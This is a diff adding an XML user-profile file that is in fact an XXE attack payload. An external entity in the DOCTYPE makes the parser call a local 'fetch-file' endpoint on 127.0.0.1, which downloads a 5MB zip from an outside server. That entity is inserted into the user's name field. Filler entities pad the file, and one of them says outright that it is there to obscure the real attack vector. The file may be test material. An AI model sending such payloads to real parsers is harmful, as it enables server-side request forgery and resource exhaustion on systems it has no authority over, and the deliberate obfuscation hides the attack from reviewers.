@@ -1,0 +1,22 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY bce SYSTEM "http://127.0.0.1:8082/fetch-file?url=http://ipv4.download.thinkbroadband.com/5MB.zip">
+  <!ENTITY distraction "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque in tortor eget elit venenatis feugiat. Mauris tincidunt velit non odio feugiat cursus.">
+  <!ENTITY extraData "User preference data: theme=dark, notifications=enabled, ads=disabled, location=on, searchHistory=true, twoFactorAuth=false">
+  <!ENTITY unused "Unused entity to add unnecessary complexity and obscure the real attack vector. This data should not be parsed but exists to create noise in the XML structure.">
+]>
+<user>
+  <id>123456</id>
+  <name>&bce;</name>  
+  <email>john.doe@example.com</email>
+  <preferences>
+      <language>en</language>
+      <timezone>UTC+2</timezone>
+      <metadata>&extraData;</metadata>
+  </preferences>
+  <comments>
+      <comment>This is a test comment</comment>
+      <comment>&distraction;</comment>
+      <comment>&unused;</comment>
+  </comments>
+</user>
